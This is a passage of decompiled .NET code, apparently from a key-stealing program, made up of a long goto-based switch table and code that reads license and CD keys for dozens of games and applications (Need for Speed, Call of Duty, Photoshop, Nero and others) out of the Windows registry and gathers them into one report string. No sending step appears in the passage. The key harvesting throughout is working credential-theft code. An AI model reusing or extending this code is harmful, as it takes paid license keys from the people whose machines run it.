							goto IL_1d91;
						case 456:
							goto IL_1d98;
						case 457:
							goto IL_1daa;
						case 458:
							goto IL_1dc7;
						case 459:
							goto IL_1dd6;
						case 460:
							goto IL_1ddd;
						case 461:
							goto IL_1def;
						case 462:
							goto IL_1e0c;
						case 463:
							goto IL_1e1b;
						case 464:
							goto IL_1e22;
						case 465:
							goto IL_1e34;
						case 466:
							goto IL_1e51;
						case 467:
							goto IL_1e60;
						case 468:
							goto IL_1e67;
						case 469:
							goto IL_1e79;
						case 470:
							goto IL_1e96;
						case 471:
							goto IL_1ea5;
						case 472:
							goto IL_1eac;
						case 473:
							goto IL_1ebe;
						case 474:
							goto IL_1edb;
						case 475:
							goto IL_1eea;
						case 476:
							goto IL_1ef1;
						case 477:
							goto IL_1f03;
						case 478:
							goto IL_1f20;
						case 479:
							goto IL_1f2f;
						case 480:
							goto IL_1f36;
						case 481:
							goto IL_1f48;
						case 482:
							goto IL_1f65;
						case 483:
							goto IL_1f74;
						case 484:
							goto IL_1f7b;
						case 485:
							goto IL_1f8d;
						case 486:
							goto IL_1faa;
						case 487:
							goto IL_1fb9;
						case 488:
							goto IL_1fc0;
						case 489:
							goto IL_1fd2;
						case 490:
							goto IL_1fef;
						case 491:
							goto IL_1ffe;
						case 492:
							goto IL_2005;
						case 493:
							goto IL_2017;
						case 494:
							goto IL_2034;
						case 495:
							goto IL_2043;
						case 496:
							goto IL_204a;
						case 497:
							goto IL_205c;
						case 498:
							goto IL_2079;
						case 499:
							goto IL_2088;
						case 500:
							goto IL_208f;
						case 501:
							goto IL_20a1;
						case 502:
							goto IL_20be;
						case 503:
							goto IL_20cd;
						case 504:
							goto IL_20d4;
						case 505:
							goto IL_20e6;
						case 506:
							goto IL_2103;
						case 507:
							goto IL_2112;
						case 508:
							goto IL_2119;
						case 509:
							goto IL_212b;
						case 510:
							goto IL_2148;
						case 511:
							goto IL_2157;
						case 512:
							goto IL_215e;
						case 513:
							goto IL_2170;
						case 514:
							goto IL_218d;
						case 515:
							goto IL_219c;
						case 516:
							goto IL_21a3;
						case 517:
							goto IL_21b5;
						case 518:
							goto IL_21d2;
						case 519:
							goto IL_21e1;
						case 520:
							goto IL_21e8;
						case 521:
							goto IL_21fa;
						case 522:
							goto IL_2217;
						case 523:
							goto IL_2226;
						case 524:
							goto IL_222d;
						case 525:
							goto IL_223f;
						case 526:
							goto IL_225c;
						case 527:
							goto IL_226b;
						case 528:
							goto IL_2272;
						case 529:
							goto IL_2284;
						case 530:
							goto IL_22a1;
						case 531:
							goto IL_22b0;
						case 532:
							goto IL_22b7;
						case 533:
							goto IL_22c9;
						case 534:
							goto IL_22e6;
						case 535:
							goto IL_22f5;
						case 536:
							goto IL_22fc;
						case 537:
							goto IL_230e;
						case 538:
							goto IL_232b;
						case 539:
							goto IL_233a;
						case 540:
							goto IL_2341;
						case 541:
							goto IL_2353;
						case 542:
							goto IL_2370;
						case 543:
							goto IL_237f;
						case 544:
							goto IL_2386;
						case 545:
							goto IL_2398;
						case 546:
							goto IL_23b5;
						case 547:
							goto IL_23c4;
						case 548:
							goto IL_23cb;
						case 549:
							goto IL_23dd;
						case 550:
							goto IL_23fa;
						case 551:
							goto IL_2409;
						case 552:
							goto IL_2410;
						case 553:
							goto IL_2422;
						case 554:
							goto IL_243f;
						case 555:
							goto IL_244e;
						case 556:
							goto IL_2455;
						case 557:
							goto IL_2467;
						case 558:
							goto IL_2484;
						case 559:
							goto IL_2493;
						case 560:
							goto IL_249a;
						case 561:
							goto IL_24ac;
						case 562:
							goto IL_24c9;
						case 563:
							goto IL_24d8;
						case 564:
							goto IL_24df;
						case 565:
							goto IL_24f1;
						case 566:
							goto IL_250e;
						case 567:
							goto IL_251d;
						case 568:
							goto IL_2524;
						case 569:
							goto IL_2536;
						case 570:
							goto IL_2553;
						case 571:
							goto IL_2562;
						case 572:
							goto IL_2569;
						case 573:
							goto IL_257b;
						case 574:
							goto IL_2598;
						case 575:
							goto IL_25a7;
						case 576:
							goto IL_25ae;
						case 577:
							goto IL_25c0;
						case 578:
							goto IL_25dd;
						case 579:
							goto IL_25ec;
						case 580:
							goto IL_25f3;
						case 581:
							goto IL_2605;
						case 582:
							goto IL_2622;
						case 583:
							goto IL_2631;
						case 584:
							goto IL_2638;
						case 585:
							goto IL_264a;
						case 586:
							goto IL_2667;
						case 587:
							goto IL_2676;
						case 588:
							goto IL_267d;
						case 589:
							goto IL_268f;
						case 590:
							goto IL_26ac;
						case 591:
							goto IL_26bb;
						case 592:
							goto IL_26c2;
						case 593:
							goto IL_26d4;
						case 594:
							goto IL_26f1;
						case 595:
							goto IL_2700;
						case 596:
							goto IL_2707;
						case 597:
							goto IL_2719;
						case 598:
							goto IL_2736;
						case 599:
							goto IL_2745;
						case 600:
							goto IL_274c;
						case 601:
							goto IL_275e;
						case 602:
							goto IL_277b;
						case 603:
							goto IL_278a;
						case 604:
							goto IL_2791;
						case 605:
							goto IL_27a3;
						case 606:
							goto IL_27c0;
						case 607:
							goto IL_27cf;
						case 608:
							goto IL_27d6;
						case 609:
							goto IL_27e8;
						case 610:
							goto IL_2805;
						case 611:
							goto IL_2814;
						case 612:
							goto IL_281b;
						case 613:
							goto IL_282d;
						case 614:
							goto IL_284a;
						case 615:
							goto IL_2859;
						case 616:
							goto IL_2860;
						case 617:
							goto IL_2872;
						case 618:
							goto IL_288f;
						case 619:
							goto IL_289e;
						case 620:
							goto IL_28a5;
						case 621:
							goto IL_28b7;
						case 622:
							goto IL_28d4;
						case 623:
							goto IL_28e3;
						case 624:
							goto IL_28ea;
						case 625:
							goto IL_28fc;
						case 626:
							goto IL_2919;
						case 627:
							goto IL_2928;
						case 628:
							goto IL_292f;
						case 629:
							goto IL_2941;
						case 630:
							goto IL_295e;
						case 631:
							goto IL_296d;
						case 632:
							goto IL_2974;
						case 633:
							goto IL_2986;
						case 634:
							goto IL_29a3;
						case 635:
							goto IL_29b2;
						case 636:
							goto IL_29b9;
						case 637:
							goto IL_29cb;
						case 638:
							goto IL_29e8;
						case 639:
							goto IL_29f7;
						case 640:
							goto IL_29fe;
						case 641:
							goto IL_2a10;
						case 642:
							goto IL_2a2d;
						case 643:
							goto IL_2a3c;
						case 644:
							goto IL_2a43;
						case 645:
							goto IL_2a55;
						case 646:
							goto IL_2a72;
						case 647:
							goto IL_2a81;
						case 648:
							goto IL_2a88;
						case 649:
							goto IL_2a9a;
						case 650:
							goto IL_2ab7;
						case 651:
							goto IL_2ac6;
						case 652:
							goto IL_2acd;
						case 653:
							goto IL_2adf;
						case 654:
							goto IL_2afc;
						case 655:
							goto IL_2b0b;
						case 656:
							goto IL_2b12;
						case 657:
							goto IL_2b24;
						case 658:
							goto IL_2b41;
						case 659:
							goto IL_2b50;
						case 660:
							goto IL_2b57;
						case 661:
							goto IL_2b69;
						case 662:
							goto IL_2b86;
						case 663:
							goto IL_2b95;
						case 664:
							goto IL_2b9c;
						case 665:
							goto IL_2bae;
						case 666:
							goto IL_2bcb;
						case 667:
							goto IL_2bda;
						case 668:
							goto IL_2be1;
						case 669:
							goto IL_2bf3;
						case 670:
							goto IL_2c10;
						case 671:
							goto IL_2c1f;
						case 672:
							goto IL_2c26;
						case 673:
							goto IL_2c38;
						case 674:
							goto IL_2c55;
						case 675:
							goto IL_2c64;
						case 676:
							goto IL_2c6b;
						case 677:
							goto IL_2c7d;
						case 678:
							goto IL_2c9a;
						case 679:
							goto IL_2ca9;
						case 680:
							goto IL_2cb0;
						case 681:
							goto IL_2cc2;
						case 682:
							goto IL_2cdf;
						case 683:
							goto IL_2cee;
						case 684:
							goto IL_2cf5;
						case 685:
							goto IL_2d07;
						case 686:
							goto IL_2d24;
						case 687:
							goto IL_2d33;
						case 688:
							goto IL_2d3a;
						case 689:
							goto IL_2d4c;
						case 690:
							goto IL_2d69;
						case 691:
							goto IL_2d78;
						case 692:
							goto IL_2d7f;
						case 693:
							goto IL_2d91;
						case 694:
							goto IL_2dae;
						case 695:
							goto IL_2dbd;
						case 696:
							goto IL_2dc4;
						case 697:
							goto IL_2dd6;
						case 698:
							goto IL_2df3;
						case 699:
							goto IL_2e02;
						case 700:
							goto IL_2e09;
						case 701:
							goto IL_2e1b;
						case 702:
							goto IL_2e38;
						case 703:
							goto IL_2e47;
						case 704:
							goto IL_2e4e;
						case 705:
							goto IL_2e60;
						case 706:
							goto IL_2e7d;
						case 707:
							goto IL_2e8c;
						case 708:
							goto IL_2e93;
						case 709:
							goto IL_2ea5;
						case 710:
							goto IL_2ec2;
						case 711:
							goto IL_2ed1;
						case 712:
							goto IL_2ed8;
						case 713:
							goto IL_2eea;
						case 714:
							goto IL_2f07;
						case 715:
							goto IL_2f16;
						case 716:
							goto IL_2f1d;
						case 717:
							goto IL_2f3e;
						case 718:
							goto IL_2f5f;
						case 719:
							goto IL_2f80;
						case 720:
							goto IL_2fa1;
						case 721:
							goto IL_2fc2;
						case 722:
							goto IL_2fe3;
						case 723:
							goto IL_3004;
						case 724:
							goto IL_3025;
						case 725:
							goto IL_3046;
						case 726:
							goto IL_3067;
						case 727:
							goto IL_3088;
						case 728:
							goto IL_30a9;
						case 729:
							goto IL_30ca;
						case 730:
							goto IL_30eb;
						case 731:
							goto IL_310c;
						case 732:
							goto IL_312d;
						case 733:
							goto IL_314c;
						case 734:
							goto IL_316d;
						case 735:
							goto IL_318e;
						case 736:
							goto IL_31af;
						case 737:
							goto IL_31d0;
						case 738:
							goto IL_31f1;
						case 739:
							goto IL_3212;
						case 740:
							goto IL_3233;
						case 741:
							goto IL_3254;
						case 742:
							goto IL_3275;
						case 743:
							goto IL_3296;
						case 744:
							goto IL_32b7;
						case 745:
							goto IL_32d8;
						case 746:
							goto IL_32f9;
						case 747:
							goto IL_331a;
						case 748:
							goto IL_333b;
						case 749:
							goto IL_335b;
						case 750:
							goto IL_337c;
						case 751:
							goto IL_339d;
						case 752:
							goto IL_33be;
						case 753:
							goto IL_33df;
						case 754:
							goto IL_3400;
						case 755:
							goto IL_3421;
						case 756:
							goto IL_3442;
						case 757:
							goto IL_3463;
						case 758:
							goto IL_3484;
						case 759:
							goto IL_34a5;
						case 760:
							goto IL_34c6;
						case 761:
							goto IL_34e7;
						case 762:
							goto IL_3504;
						case 763:
							goto IL_3521;
						case 764:
							goto IL_3542;
						case 765:
							goto IL_355f;
						case 766:
							goto IL_357c;
						case 767:
							goto IL_3599;
						case 768:
							goto IL_35b6;
						case 769:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 770:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_35b6:
					num = 768;
					text52 = "Orange Box :" + text + "\r\nPes 2008 :" + text2 + "\r\nMirc Username :" + text3 + "Mirc Serial :" + text4 + "\r\nFifa 2002 :" + text5 + "\r\nFifa 2003 :" + text6 + "\r\nFifa 2004 :" + text7 + "\r\nFifa 2005 :" + text8 + "\r\nFifa 2007 :" + text9 + "\r\nFifa 2008 :" + text10 + "\r\nFar Cry :" + text11 + "\r\nFar Cry 2 :" + text12 + "\r\nF.E.A.R :" + text13 + "\r\nCyberlink PowerBAR :" + text13 + "\r\nCyberlink PowerDVD :" + text14 + "\r\nCamtasia Username :" + text15 + "Password :" + text16 + "\r\nThe Sims 3 :" + text17 + "\r\nThe Sims 2 :" + text18 + "\r\nThe Sims Fun Family Stuff :" + text19 + "\r\nBattlefield 2 - Special Forces :" + text20 + "\r\nThe Sims Glamour Life Stuff :" + text21 + "\r\nThe Sims NightLife :" + text22 + "\r\nNero 5 & 6 :" + text23 + "\r\nNero 7 :" + text24 + "\r\nNero 8 :" + text25 + "\r\nNero 9 :" + text26 + "\r\nThe Sims 2 Open For Bussines :" + text27 + "\r\nBully Scholarship Edition Bully Scholarship Edition :" + text28 + "\r\nTransformers 2 - Revenge of the Fallen :" + text29 + "\r\nThe Sims 2 Univeristy :" + text30 + "\r\nMirrorsEdge™ :" + text31 + "\r\nDeadSpace :" + text32 + "\r\nSpore :" + text33 + "\r\nFIFA 09 :" + text34 + "\r\nPES 2009 :" + text35 + "\r\nCall of Duty :" + text36 + "\r\nCall of Duty 2 :" + text37 + "\r\nCall of Duty 4 :" + text38 + "\r\nCall of Duty 5 :" + text39 + "\r\nHalf Life 1 :" + text40 + "\r\nHalo :" + text41 + "\r\nCounter Strike 1.6 :" + text42 + "\r\nSerial Key of " + ((ServerComputer)Class1.smethod_0()).get_Info().get_OSFullName() + " :" + text43 + "\r\nGTA IV Serial Key :" + text44 + "\r\nCamTasia7 UserName :" + text45 + "\r\nCamTasia7 Serial:" + text46 + "\r\nFIFA10 :" + text47 + "\r\nTuneUp2010(UserName) :" + text48 + text49 + "\r\nTuneUp2010(Key) :" + text50 + text51;
					break;
					IL_0008:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_000f;
					IL_000f:
					num = 3;
					text53 += "\r\nNeed for Speed Carbon :";
					goto IL_001d;
					IL_001d:
					num = 4;
					text54 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\Electronic Arts\\Need for Speed Carbon", "ergc", null));
					goto IL_0035;
					IL_0035:
					num = 5;
					text53 += text54;
					goto IL_003f;
					IL_003f:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0046;
					IL_0046:
					num = 7;
					text53 += "\r\nNeed For Speed Hot Pursuit 2 :";
					goto IL_0054;
					IL_0054:
					num = 8;
					text55 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA GAMES\\Need For Speed Hot Pursuit 2", "ergc", null));
					goto IL_006d;
					IL_006d:
					num = 9;
					text53 += text55;
					goto IL_0079;
					IL_0079:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0080;
					IL_0080:
					num = 11;
					text53 += "\r\nNeed for Speed Most Wanted :";
					goto IL_008f;
					IL_008f:
					num = 12;
					text56 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA GAMES\\Need for Speed Most Wanted", "ergc", null));
					goto IL_00a9;
					IL_00a9:
					num = 13;
					text53 += text56;
					goto IL_00b5;
					IL_00b5:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_00bc;
					IL_00bc:
					num = 15;
					text53 += "\r\nNeed for Speed ProStreet :";
					goto IL_00cb;
					IL_00cb:
					num = 16;
					text57 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\Electronic Arts\\Need for Speed ProStreet", "ergc", null));
					goto IL_00e5;
					IL_00e5:
					num = 17;
					text53 += text57;
					goto IL_00f1;
					IL_00f1:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_00f8;
					IL_00f8:
					num = 19;
					text53 += "\r\nNeed For Speed Underground :";
					goto IL_0107;
					IL_0107:
					num = 20;
					text58 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA GAMES\\Need For Speed Underground", "ergc", null));
					goto IL_0121;
					IL_0121:
					num = 21;
					text53 += text58;
					goto IL_012d;
					IL_012d:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0134;
					IL_0134:
					num = 23;
					text53 += "\r\nNeed for Speed Underground 2 :";
					goto IL_0143;
					IL_0143:
					num = 24;
					text59 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Games\\Need for Speed Underground 2", "ergc", null));
					goto IL_015d;
					IL_015d:
					num = 25;
					text53 += text59;
					goto IL_0169;
					IL_0169:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0170;
					IL_0170:
					num = 27;
					text53 += "\r\nMedieval II Total War : ";
					goto IL_017f;
					IL_017f:
					num = 28;
					text60 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\SEGA\\Medieval II Total War", "CDKey", null));
					goto IL_0199;
					IL_0199:
					num = 29;
					text53 += text60;
					goto IL_01a5;
					IL_01a5:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_01ac;
					IL_01ac:
					num = 31;
					text53 += "\r\nAdobe Goolive : ";
					goto IL_01bb;
					IL_01bb:
					num = 32;
					text61 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Adobe\\Golive\\5.0\\Registration", "SERIAL", null));
					goto IL_01d5;
					IL_01d5:
					num = 33;
					text53 += text61;
					goto IL_01e1;
					IL_01e1:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_01e8;
					IL_01e8:
					num = 35;
					text53 += "\r\nNero 7 : ";
					goto IL_01f7;
					IL_01f7:
					num = 36;
					text62 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\ahead\\Installation\\BAK\\Nero 7\\Info", "Serial7_1190555485", null));
					goto IL_0211;
					IL_0211:
					num = 37;
					text53 += text62;
					goto IL_021d;
					IL_021d:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0224;
					IL_0224:
					num = 39;
					text63 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Ubisoft\\Splinter Cell Pandora Tomorrow", "CDKey", null));
					goto IL_023e;
					IL_023e:
					num = 40;
					text53 = text53 + "Splinter Cell Pandora Tomorrow : " + text63;
					goto IL_024f;
					IL_024f:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0256;
					IL_0256:
					num = 42;
					text64 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Ubisoft\\Splinter Cell Chaos Theory\\Keys", "DiscKey_SCCT", null));
					goto IL_0270;
					IL_0270:
					num = 43;
					text53 = text53 + "\r\nSplinter Cell Chaos Theory : " + text64;
					goto IL_0281;
					IL_0281:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0288;
					IL_0288:
					num = 45;
					text65 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Activision\\Call of Duty", "codkey", null));
					goto IL_02a2;
					IL_02a2:
					num = 46;
					text53 = text53 + "\r\nCall of Duty : " + text65;
					goto IL_02b3;
					IL_02b3:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_02ba;
					IL_02ba:
					num = 48;
					text66 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Activision\\Call of Duty United Offensive", "key", null));
					goto IL_02d4;
					IL_02d4:
					num = 49;
					text53 = text53 + "\r\nCall of Duty United Offensive : " + text66;
					goto IL_02e5;
					IL_02e5:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_02ec;
					IL_02ec:
					num = 51;
					text67 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Activision\\Call of Duty 2", "codkey", null));
					goto IL_0306;
					IL_0306:
					num = 52;
					text53 = text53 + "\r\nCall of Duty 2 : " + text67;
					goto IL_0317;
					IL_0317:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_031e;
					IL_031e:
					num = 54;
					text68 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Activision\\Call of Duty 4", "codkey", null));
					goto IL_0338;
					IL_0338:
					num = 55;
					text53 = text53 + "\r\nCall of Duty 4 : " + text68;
					goto IL_0349;
					IL_0349:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0350;
					IL_0350:
					num = 57;
					text69 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Activision\\Call of Duty WAW", "codkey", null));
					goto IL_036a;
					IL_036a:
					num = 58;
					text53 = text53 + "\r\nCall of Duty WAW : " + text69;
					goto IL_037b;
					IL_037b:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0382;
					IL_0382:
					num = 60;
					text53 += "\r\nDawn of War : ";
					goto IL_0391;
					IL_0391:
					num = 61;
					text70 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\THQ\\Dawn of War", "CDKEY", null));
					goto IL_03ab;
					IL_03ab:
					num = 62;
					text53 += text70;
					goto IL_03b7;
					IL_03b7:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_03be;
					IL_03be:
					num = 64;
					text53 += "\r\nDawn of War - Dark Crusade : ";
					goto IL_03cd;
					IL_03cd:
					num = 65;
					text71 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\THQ\\Dawn of War - Dark Crusade", "CDKEY", null));
					goto IL_03e7;
					IL_03e7:
					num = 66;
					text53 += text71;
					goto IL_03f3;
					IL_03f3:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_03fa;
					IL_03fa:
					num = 68;
					text53 += "\r\nDawn of War - Dark Crusade : ";
					goto IL_0409;
					IL_0409:
					num = 69;
					text72 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\THQ\\Dawn of War - Dark Crusade", "W40KCDKEY", null));
					goto IL_0423;
					IL_0423:
					num = 70;
					text53 += text72;
					goto IL_042f;
					IL_042f:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0436;
					IL_0436:
					num = 72;
					text53 += "\r\nDawn of War - Dark Crusade : ";
					goto IL_0445;
					IL_0445:
					num = 73;
					text73 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\THQ\\Dawn of War - Dark Crusade", "WXPCDKEY", null));
					goto IL_045f;
					IL_045f:
					num = 74;
					text53 += text73;
					goto IL_046b;
					IL_046b:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0472;
					IL_0472:
					num = 76;
					text53 += "\r\nACDSystems PicAView : ";
					goto IL_0481;
					IL_0481:
					num = 77;
					text74 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\ACD Systems\\PicaView", "LicenseNumber", null));
					goto IL_049b;
					IL_049b:
					num = 78;
					text53 += text74;
					goto IL_04a7;
					IL_04a7:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_04ae;
					IL_04ae:
					num = 80;
					text53 += "\r\nAct of War : ";
					goto IL_04bd;
					IL_04bd:
					num = 81;
					text75 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Eugen Systems\\ActOfWa", "RegNumber", null));
					goto IL_04d7;
					IL_04d7:
					num = 82;
					text53 += text75;
					goto IL_04e3;
					IL_04e3:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_04ea;
					IL_04ea:
					num = 84;
					text53 += "\r\nAdobe Photoshop 7 :";
					goto IL_04f9;
					IL_04f9:
					num = 85;
					text76 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Adobe\\Photoshop\\7.0\\Registration", "SERIAL", null));
					goto IL_0513;
					IL_0513:
					num = 86;
					text53 += text76;
					goto IL_051f;
					IL_051f:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0526;
					IL_0526:
					num = 88;
					text53 += "\r\nAdvanced PDF Password Recovery :";
					goto IL_0535;
					IL_0535:
					num = 89;
					text77 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Elcom\\Advanced PDF Password Recovery\\Registration", "Code", null));
					goto IL_054f;
					IL_054f:
					num = 90;
					text53 += text77;
					goto IL_055b;
					IL_055b:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0562;
					IL_0562:
					num = 92;
					text53 += "\r\nAdvanced PDF Password Recovery Pro :";
					goto IL_0571;
					IL_0571:
					num = 93;
					text78 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Elcom\\Advanced PDF Password Recovery Pro\\Registration", "Code", null));
					goto IL_058b;
					IL_058b:
					num = 94;
					text53 += text78;
					goto IL_0597;
					IL_0597:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_059e;
					IL_059e:
					num = 96;
					text53 += "\r\nAdvanced ZIP Password Recovery :";
					goto IL_05ad;
					IL_05ad:
					num = 97;
					text79 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Elcom\\Advanced ZIP Password Recovery\\Registration", "Code", null));
					goto IL_05c7;
					IL_05c7:
					num = 98;
					text53 += text79;
					goto IL_05d3;
					IL_05d3:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_05da;
					IL_05da:
					num = 100;
					text53 += "\r\nBattlefield Vietnam";
					goto IL_05e9;
					IL_05e9:
					num = 101;
					text80 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Electronic Arts\\EA GAMES\\Battlefield Vietnam", "ergc", null));
					goto IL_0603;
					IL_0603:
					num = 102;
					text53 += text80;
					goto IL_060f;
					IL_060f:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0616;
					IL_0616:
					num = 104;
					text53 += "\r\nBlack and White";
					goto IL_0625;
					IL_0625:
					num = 105;
					text81 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Electronic Arts\\EA GAMES\\Black and White", "ergc", null));
					goto IL_063f;
					IL_063f:
					num = 106;
					text53 += text81;
					goto IL_064b;
					IL_064b:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0652;
					IL_0652:
					num = 108;
					text53 += "\r\nBlack and White 2 :";
					goto IL_0661;
					IL_0661:
					num = 109;
					text82 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\Software\\Electronic Arts\\Black and White 2", "ergc", null));
					goto IL_067b;
					IL_067b:
					num = 110;
					text53 += text82;
					goto IL_0687;
					IL_0687:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_068e;
					IL_068e:
					num = 112;
					text53 += "\r\nBoulder Dash Rocks :";
					goto IL_069d;
					IL_069d:
					num = 113;
					text83 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Games\\Boulder Dash Rocks", "ergc", null));
					goto IL_06b7;
					IL_06b7:
					num = 114;
					text53 += text83;
					goto IL_06c3;
					IL_06c3:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_06ca;
					IL_06ca:
					num = 116;
					text53 += "\r\nBurnout Paradise :";
					goto IL_06d9;
					IL_06d9:
					num = 117;
					text84 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Games\\Burnout Paradise", "ergc", null));
					goto IL_06f3;
					IL_06f3:
					num = 118;
					text53 += text84;
					goto IL_06ff;
					IL_06ff:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0706;
					IL_0706:
					num = 120;
					text53 += "\r\nAnno 1701 :";
					goto IL_0715;
					IL_0715:
					num = 121;
					text85 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Sunflowers\\Anno 1701", "SerialNo", null));
					goto IL_072f;
					IL_072f:
					num = 122;
					text53 += text85;
					goto IL_073b;
					IL_073b:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0742;
					IL_0742:
					num = 124;
					text53 += "\r\nAshamopp WinOptimizer Platinum :";
					goto IL_0751;
					IL_0751:
					num = 125;
					text86 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\ashampoo\\Ashampoo WinOptimizer Platinum 3", "Key", null));
					goto IL_076b;
					IL_076b:
					num = 126;
					text53 += text86;
					goto IL_0777;
					IL_0777:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_077e;
					IL_077e:
					num = 128;
					text53 += "\r\nAV Voice Changer :";
					goto IL_0790;
					IL_0790:
					num = 129;
					text87 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\@stake\\LC5\\Registration", "Unlock Code", null));
					goto IL_07ad;
					IL_07ad:
					num = 130;
					text53 += text87;
					goto IL_07bc;
					IL_07bc:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_07c3;
					IL_07c3:
					num = 132;
					text53 += "\r\nBattlefield(1942) :";
					goto IL_07d5;
					IL_07d5:
					num = 133;
					text88 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA GAMES\\Battlefield 1942", "ergc", null));
					goto IL_07f2;
					IL_07f2:
					num = 134;
					text53 += text88;
					goto IL_0801;
					IL_0801:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0808;
					IL_0808:
					num = 136;
					text53 += "\r\nBattlefield 1942 Secret Weapons of WWII :";
					goto IL_081a;
					IL_081a:
					num = 137;
					text89 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA GAMES\\Battlefield 1942 Secret Weapons of WWII", "ergc", null));
					goto IL_0837;
					IL_0837:
					num = 138;
					text53 += text89;
					goto IL_0846;
					IL_0846:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_084d;
					IL_084d:
					num = 140;
					text53 += "\r\nBattlefield 1942 The Road to Rome :";
					goto IL_085f;
					IL_085f:
					num = 141;
					text90 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA GAMES\\Battlefield 1942 The Road to Rome", "ergc", null));
					goto IL_087c;
					IL_087c:
					num = 142;
					text53 += text90;
					goto IL_088b;
					IL_088b:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0892;
					IL_0892:
					num = 144;
					text53 += "\r\nBattlefield 2 :";
